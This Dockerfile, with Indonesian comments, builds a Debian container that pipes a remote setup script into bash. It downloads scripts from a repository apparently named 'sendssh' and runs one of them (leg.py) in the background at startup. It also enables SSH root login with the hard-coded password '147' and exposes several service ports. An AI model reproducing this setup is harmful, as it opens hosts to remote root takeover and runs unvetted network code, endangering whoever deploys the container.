FROM debian:stable
ENV DEBIAN_FRONTEND=noninteractive

# Install dependency
RUN apt update && apt upgrade -y && apt install -y \
    openssh-server git wget sudo nano curl python3 python3-pip passwd \
    && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt install -y nodejs \
    && rm -rf /var/lib/apt/lists/*

# Clone repo & download script
RUN git clone https://github.com/x011-al/nbwc
RUN wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/leg.py \
    && wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/cgn.py

# Setup SSH + entrypoint script
RUN mkdir -p /run/sshd
RUN echo "#!/bin/bash" > /openssh.sh
RUN echo "sleep 5" >> /openssh.sh
RUN echo "python3 /leg.py &" >> /openssh.sh
RUN echo "/usr/sbin/sshd -D" >> /openssh.sh

# Konfigurasi SSH
RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
RUN echo "root:147" | chpasswd

# Izinkan script jalan
RUN chmod 755 /openssh.sh

# Expose port
EXPOSE 22 80 443 3306 8080

# Jalankan script utama
ENTRYPOINT ["/openssh.sh"]
